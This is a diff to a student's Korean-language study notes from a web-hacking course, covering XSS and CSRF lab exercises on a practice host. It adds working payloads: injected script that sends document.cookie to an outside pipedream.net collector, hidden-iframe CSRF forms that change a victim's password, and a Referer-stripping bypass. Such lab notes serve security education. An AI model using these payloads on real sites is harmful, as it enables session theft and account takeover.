@@ -319,6 +319,9 @@ flag :
 
 5번(xss_7) : http://normaltic.com:1018/xss_7/notice_update.php?id=42
 </textarea><script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script> <textarea>
+정답
+http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234
+
 flag :
 
 6번(xss_6) : http://normaltic.com:1018/xss_6/notice_update.php?id=66
@@ -398,7 +401,7 @@ why??
 -------------자동실행(document.forms)----------------
 
 <form method="POST" action="-">
-	<input type="hidden" name="email" value="normaltic@test.com">
+	<input type="hidden" name="email" value="pajji@test.com">
 </form>
 <script>
       document.forms[0].submit();
@@ -406,7 +409,7 @@ why??
 -------------버튼 가리기(iframe), 페이지 이동 강제(body onload)----------------
 
 
-<iframe width="0" heigth="0" border="0" name="stealthframe">
+<iframe style="visibility:hidden;display:none" name="stealthframe">
 </iframe>
 
 <body onload="document.csrf_form.submit();">
@@ -416,14 +419,15 @@ why??
 <script>
 	document.forms[0].submit();
 </script>
-
-https://0a6c006a034c4de9c04299ab00a90010.web-security-academy.net/my-account/change-email
+http://normaltic.com:1018/xss_7/notice_list.php
 
 ----------------post 일때 위 코드 사용-----------------
 * 과제
 
 1. GET Credential (xss_7)
 -> XSS 찾기! update 아님..
+http://normaltic.com:1018/xss_7/login.php?id=1}');alert(1);('&pw=1234
+http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234
 
 2. CSRF
 - 개념 정리
@@ -435,38 +439,131 @@ https://0a6c006a034c4de9c04299ab00a90010.web-security-academy.net/my-account/cha
 
 ?>
 
+-----------------------------------------------------------------------
+8주차 수업
+<?php
+> 해킹대회 참여해봐라!
+- CTF "flag"
+- Bug Bounty
+
+> 해킹 컨퍼런스
+- Codegate
+컴퓨터 관련 컨퍼런스 참여 경험
+------------------------------------------------------------------------
+SQL Injection > 서버 측 공격(서버에게 공격을 날린다.)
+
+XSS / CSRF > 클라이언트 측 공격(클라이언트에게 공격을 날린다.): 사이트 이용자가 있어야한다.
+
+\ : escape 문자 뒷글자(특수문자)를 그냥 문자로 인식
+\' : 문자그대로의 '로 인식
+
+-------------------------------------------------------------------------
+* CSRF 공격
+> 피해자가 자신도 모르게 서버로 임의의 요청을 하게 만드는 공격
+ex) "비밀번호 바꿔줘!", "이메일 주소 바꿔줘!", "게시글 작성해!" 등
+
+GET / POST
+GET 요청 : 파라미터가 URL에 포함
+- "나 비밀번호 1234로 바꿔줘!"
+> http://akdajsdkaskdk.com
+
+XSS
+<img src="http://sdasdasd.com">
+
+--------------------------------------------------------------------------
+* CSRF 공방
+post로 바꾸면 되겠네!
+> xss
+<form>
+
+</form>
+
+- Referrer 헤더 검증 / Referrer를 지워버리면 끝??
+> 하위 호환
+
+만약, refeter 헤더가 있으면 검사!
+없으면, 넘어가자!
+
+레퍼러 삭제 코드
+<meta name="referrer" content="no-referrer">
+
+CSRF 토큰
+> 랜덤한 값.
+>> xss가 있으면 값을 가져올 수 있다..
+
+>> 인증정보 추가
+ex) pw파라미터 등...
+?>
+
+인증
+
+- CSRF Token 값 가져오는 코드
+
+<iframe id="getCSRFToken" src="http://adas.com/mypage.php" width=
+
+<script>
+function exploit() {
+	var token = document.gerElemenById("getCSRFToken").contentDocument
+
+}
+</script>
 
 
 
+
+CSRF part 1 / http://normaltic.com:7777/csrf_1/notice_read.php?id=154&view=1
+<body onload="location.href='http://normaltic.com:7777/csrf_1/mypage_update.php?id=&info=&pw=1234'";>
+
+
+CSRF Part 2 / http://normaltic.com:7777/csrf_2/notice_update.php?id=40&view=1
+<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
+</iframe>
+<body onload="document.csrf_form.submit();">
+<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
+	<input type="hidden" name="pw" value="1234">
+</form>
+------------------------------
+<script>
+	document.forms[0].submit();
+</script>
+
+CSRF Part 3 / http://normaltic.com:7777/csrf_3/notice_update.php?id=89&view=1
+<meta name="referrer" content="no-referrer">
+
+<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
+</iframe>
+<body onload="document.csrf_form.submit();">
+<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
+	<input type="hidden" name="pw" value="1234">
+</form>
+
+과제
+1) CSRF 문제 1, 2
+2) CSRF 연구 보고서 작성
+3) 웹 개발
+4) CSRF 문제 풀이 3
+
+<script>
+var csrf_token = $("#csrf_token").html();
+alert(csrf_token);
+</script>
 .
-...
 .
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-..
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
+<html>
+  <!-- CSRF PoC - Burp Suite Professional에서 생성 -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+	<body onload="document.csrf_form.submit();">
+    <form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_3/mypage_update.php">
+      <input type="hidden" name="pw" value="1234"/>
+      <input type="hidden" name="csrf_token" value=MD5(document.cookie) />
+			<meta name="referrer" content="no-r  eferrer">
+    </form>
+  </body>
+</html>
+
+RE111590460NL
+
 .
 .
 ..
